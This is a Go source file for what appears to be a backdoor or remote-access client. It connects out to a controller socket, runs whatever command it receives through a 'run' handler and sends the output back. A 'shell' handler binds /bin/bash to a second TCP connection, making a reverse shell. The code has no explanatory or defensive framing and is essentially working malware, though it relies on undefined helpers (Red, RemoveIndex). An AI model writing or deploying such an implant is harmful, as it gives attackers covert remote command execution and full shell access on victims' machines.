package main

import(
	"fmt"
	"net"
	"os/exec"
	"strings"
	"log"
	"bytes"
	
)


func checkErr(err error){
	if err != nil{
		log.Fatal(err)
	}
}


func processmsg(msg string, con net.Conn){



	fmt.Println("Server got:", msg)

	cmd := strings.Fields(msg)


	switch(cmd[0]){

	case "run":

		com := RemoveIndex(cmd, 0)
		coml := com[0]
		args := RemoveIndex(com, 0)
		out, err := exec.Command(coml, args...).Output()
		con.Write([]byte(out))

		fmt.Println(coml, args)

		if (err != nil){
			con.Write([]byte(Red + err.Error()))
		}


	case "shell":

		nc, err := net.Dial("tcp", "127.0.0.1:8888")

		checkErr(err)

		cmd := exec.Command("/bin/bash")
		cmd.Stdin = nc
		cmd.Stdout = nc
		cmd.Stderr = nc
	
		cmd.Run()
		




	default:
		con.Write([]byte(Red + "Invalid command " + cmd[0]))
	}

	

}



func main(){

	for {
		insock, err := net.Dial("tcp", "127.0.0.1:9999")

		if err != nil{
			continue
		}

		_, err = insock.Write([]byte("Hey"))

		if err != nil{
			continue
		}
		for {

		
			for {
				buf := make([]byte, 4096)
				_, err := insock.Read(buf)
				buf = bytes.Trim(buf, "\x00")
				checkErr(err)
				fmt.Print(string(buf))
				go processmsg(string(buf), insock)
				
			}
		}


	}



		
}